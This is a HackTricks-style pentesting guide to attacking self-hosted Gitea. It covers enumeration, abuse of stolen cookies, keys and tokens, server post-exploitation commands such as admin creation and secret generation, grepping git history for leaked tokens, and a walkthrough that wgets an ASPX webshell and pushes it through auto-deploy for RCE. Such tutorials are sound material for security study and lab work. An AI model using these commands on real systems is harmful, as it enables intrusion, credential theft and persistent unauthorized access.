# Gitea Security

{{#include ../../banners/hacktricks-training.md}}

## What is Gitea

**Gitea** is a **self-hosted community managed lightweight code hosting** solution written in Go.

![](<../../images/image (160).png>)

### Basic Information

{{#ref}}
basic-gitea-information.md
{{#endref}}

## Lab

To run a Gitea instance locally you can just run a docker container:

```bash
docker run -p 3000:3000 gitea/gitea
```

Connect to port 3000 to access the web page.

You could also run it with kubernetes:

```
helm repo add gitea-charts https://dl.gitea.io/charts/
helm install gitea gitea-charts/gitea
```

## Unauthenticated Enumeration

- Public repos: [http://localhost:3000/explore/repos](http://localhost:3000/explore/repos)
- Registered users: [http://localhost:3000/explore/users](http://localhost:3000/explore/users)
- Registered Organizations: [http://localhost:3000/explore/organizations](http://localhost:3000/explore/organizations)
- API Swagger/OpenAPI docs (if enabled): `http(s)://<host>:<port>/api/swagger`

Note that by **default Gitea allows new users to register**. This won't give specially interesting access to the new users over other organizations/users repos, but a **logged in user** might be able to **visualize more repos or organizations**.

## Internal Exploitation

For this scenario we are going to suppose that you have obtained some access to a github account.

### With User Credentials/Web Cookie

If you somehow already have credentials for a user inside an organization (or you stole a session cookie) you can **just login** and check which which **permissions you have** over which **repos,** in **which teams** you are, **list other users**, and **how are the repos protected.**

Note that **2FA may be used** so you will only be able to access this information if you can also **pass that check**.

> [!NOTE]
> Note that if you **manage to steal the `i_like_gitea` cookie** (currently configured with SameSite: Lax) you can **completely impersonate the user** without needing credentials or 2FA.

### With User SSH Key

Gitea allows **users** to set **SSH keys** that will be used as **authentication method to deploy code** on their behalf (no 2FA is applied).

With this key you can perform **changes in repositories where the user has some privileges**, however you can not use it to access gitea api to enumerate the environment. However, you can **enumerate local settings** to get information about the repos and user you have access to:

```bash
# Go to the the repository folder
# Get repo config and current user name and email
git config --list
```

If the user has configured its username as his gitea username you can access the **public keys he has set** in his account in _https://github.com/<gitea_username>.keys_, you could check this to confirm the private key you found can be used.

**SSH keys** can also be set in repositories as **deploy keys**. Anyone with access to this key will be able to **launch projects from a repository**. Usually in a server with different deploy keys the local file **`~/.ssh/config`** will give you info about key is related.

#### GPG Keys

As explained [**here**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/gitea-security/broken-reference/README.md) sometimes it's needed to sign the commits or you might get discovered.

Check locally if the current user has any key with:

```shell
gpg --list-secret-keys --keyid-format=long
```

### With User Token

For an introduction about [**User Tokens check the basic information**](basic-gitea-information.md#personal-access-tokens).

A user token can be used **instead of a password** to **authenticate** against Gitea server [**via API**](https://try.gitea.io/api/swagger#/). it will has **complete access** over the user.

### With Oauth Application

For an introduction about [**Gitea Oauth Applications check the basic information**](#with-oauth-application).

An attacker might create a **malicious Oauth Application** to access privileged data/actions of the users that accepts them probably as part of a phishing campaign.

As explained in the basic information, the application will have **full access over the user account**.

### Branch Protection Bypass

In Github we have **github actions** which by default get a **token with write access** over the repo that can be used to **bypass branch protections**. In this case that **doesn't exist**, so the bypasses are more limited. But lets take a look to what can be done:

- **Enable Push**: If anyone with write access can push to the branch, just push to it.
- **Whitelist Restricted Pus**h: The same way, if you are part of this list push to the branch.
- **Enable Merge Whitelist**: If there is a merge whitelist, you need to be inside of it
- **Require approvals is bigger than 0**: Then... you need to compromise another user
- **Restrict approvals to whitelisted**: If only whitelisted users can approve... you need to compromise another user that is inside that list
- **Dismiss stale approvals**: If approvals are not removed with new commits, you could hijack an already approved PR to inject your code and merge the PR.

Note that **if you are an org/repo admin** you can bypass the protections.

### Enumerate Webhooks

**Webhooks** are able to **send specific gitea information to some places**. You might be able to **exploit that communication**.\
However, usually a **secret** you can **not retrieve** is set in the **webhook** that will **prevent** external users that know the URL of the webhook but not the secret to **exploit that webhook**.\
But in some occasions, people instead of setting the **secret** in its place, they **set it in the URL** as a parameter, so **checking the URLs** could allow you to **find secrets** and other places you could exploit further.

Webhooks can be set at **repo and at org level**.

## Post Exploitation

### Inside the server

If somehow you managed to get inside the server where gitea is running you should search for the gitea configuration file. By default it's located in `/data/gitea/conf/app.ini`

In this file you can find **keys** and **passwords**.

In the gitea path (by default: /data/gitea) you can find also interesting information like:

- The **sqlite** DB: If gitea is not using an external db it will use a sqlite db
- The **sessions** inside the sessions folder: Running `cat sessions/*/*/*` you can see the usernames of the logged users (gitea could also save the sessions inside the DB).
- The **jwt private key** inside the jwt folder
- More **sensitive information** could be found in this folder

If you are inside the server you can also **use the `gitea` binary** to access/modify information:

- `gitea dump` will dump gitea and generate a .zip file
- `gitea generate secret INTERNAL_TOKEN/JWT_SECRET/SECRET_KEY/LFS_JWT_SECRET` will generate a token of the indicated type (persistence)
- `gitea admin user change-password --username admin --password newpassword` Change the password
- `gitea admin user create --username newuser --password superpassword --email user@user.user --admin --access-token` Create new admin user and get an access token

---

## Gitea API quick wins with a Personal Access Token (PAT)

- Swagger/OpenAPI is typically exposed at `/api/swagger`. It documents all REST endpoints available on that instance.
- Authentication headers for PATs: prefer `Authorization: token <PAT>` (supported forms also include `?token=<PAT>` / `?access_token=<PAT>` query params). For OAuth2 access tokens, use `Authorization: bearer <token>`.

Examples:

```bash
# Verify token and get current user
curl -s http://<host>:3000/api/v1/user \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" | jq .

# List repositories visible to the token
curl -s http://<host>:3000/api/v1/user/repos \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" | jq '.[].full_name'

# List repo contents (root)
OWNER=ellen.freeman
REPO=website
curl -s http://<host>:3000/api/v1/repos/$OWNER/$REPO/contents \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" | jq -r '.[].name'

# Read and decode a file content (API returns base64 by default)
PATH=readme.md
curl -s http://<host>:3000/api/v1/repos/$OWNER/$REPO/contents/$PATH \
  -H "Authorization: token $GITEA_ACCESS_TOKEN" \
  | jq -r .content | base64 -d
```

Cloning with a PAT over HTTPS:

```bash
# Option 1: embed basic-auth in URL (username:token)
# Note: this will leak in shell history and process lists; use with care
git clone http://<username>:<PAT>@<host>:3000/<owner>/<repo>.git

# Option 2: use an extra HTTP header (safer for logs/history)
git -c http.extraHeader="Authorization: token $PAT" \
    clone http://<host>:3000/<owner>/<repo>.git
```

> Tip: The API returns base64 for file contents; use `jq -r .content | base64 -d` to recover plaintext. Add `?ref=<branch_or_commit>` to target a specific revision.

## Leaked secrets in Git history (recovering PATs)

Even if a secret has been “removed” from the current tree, it may still be present in older commits. Public or internal repositories often leak Personal Access Tokens (PATs) or credentials in history.

Minimal manual workflow:

```bash
git clone http://<host>:3000/<owner>/<repo>.git
cd <repo>

# Grep through all diffs in all branches/tags for juicy strings
git log -p --all | grep -iE 'token|access[_-]?token|apikey|secret|bearer'

# Or use git’s regex search over diffs
git log -G '(?i)token|secret|password' -p --all

# Inspect a specific commit diff
git show <commit_sha>

# Show a file as it existed in a past commit
git show <commit_sha>:path/to/file
```

If you recover a valid PAT from history, you can immediately use it against the REST API as shown above to enumerate private repositories and read their contents.

## Abusing auto-deploy CI/CD to gain RCE on IIS (example)

If a repository is wired to auto-deploy to a production IIS webroot (common for "static" sites), pushing a server-executable file like `.aspx` can yield remote code execution:

```bash
# Clone the website repo using a token
export PAT=... 
OWNER=ellen.freeman
REPO=website

# safer clone with header
git -c http.extraHeader="Authorization: token $PAT" \
    clone http://<host>:3000/$OWNER/$REPO.git
cd $REPO

# Add an ASPX webshell (example PoC)
wget -O shell.aspx https://raw.githubusercontent.com/grov/webshell/master/webshell-LT.aspx

git add shell.aspx
git -c user.email=x@y.z -c user.name=x commit -m "update"
git push

# Within seconds, browse to the deployed path
# http://<site>/shell.aspx
```

Notes:
- This works when the deployment pipeline publishes repository files directly into an IIS site where ASP.NET handlers are enabled for .aspx.
- Branch protections and CI policies may block direct pushes; assess protections first. If you can push to a deployed branch, you can likely publish arbitrary server-side files.

Once a webshell is accessible, you can execute native commands or drop a reverse shell payload (for example, a base64-encoded PowerShell one-liner).

## References

- [0xdf: HTB Lock (Gitea PAT leak → CI/CD → IIS RCE)](https://0xdf.gitlab.io/2025/08/21/htb-lock.html)
- [Gitea API Usage (auth headers, tokens)](https://docs.gitea.com/development/api-usage)
- [Instance API Swagger (try.gitea.io)](https://try.gitea.io/api/swagger)
- [ASPX webshell example (webshell-LT.aspx)](https://github.com/grov/webshell/blob/master/webshell-LT.aspx)
- [RevShells.com PowerShell reverse shells](https://www.revshells.com/)

{{#include ../../banners/hacktricks-training.md}}